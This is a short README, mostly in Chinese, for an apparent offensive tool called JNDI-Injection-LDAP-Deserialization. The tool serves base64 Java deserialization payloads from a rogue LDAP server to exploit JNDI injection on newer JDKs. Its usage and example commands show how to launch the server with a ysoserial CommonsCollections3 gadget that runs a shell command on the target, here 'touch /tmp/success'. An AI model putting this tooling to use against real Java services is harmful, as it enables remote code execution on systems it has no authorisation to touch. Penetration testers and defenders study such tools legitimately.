# JNDI-Injection-LDAP-Deserialization

JNDI注入利用工具，LDAP+原生反序列化 方式绕过高版本JDK，需要配合ysoserial等序列化数据生成工具

## Usage
```bash
java -jar JNDI-Injection-LDAP-Deserialization-1.0-SNAPSHOT.jar LDAP服务端口 Base64编码的序列化数据
```



## Examples

```bash
java -jar JNDI-Injection-LDAP-Deserialization-1.0-SNAPSHOT.jar 1389 `java -jar  ~/Tools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections3 'touch /tmp/success' |base64`
```



## Building

Java 1.8 and Maven 3.x

```bash
mvn clean package -DskipTests
```

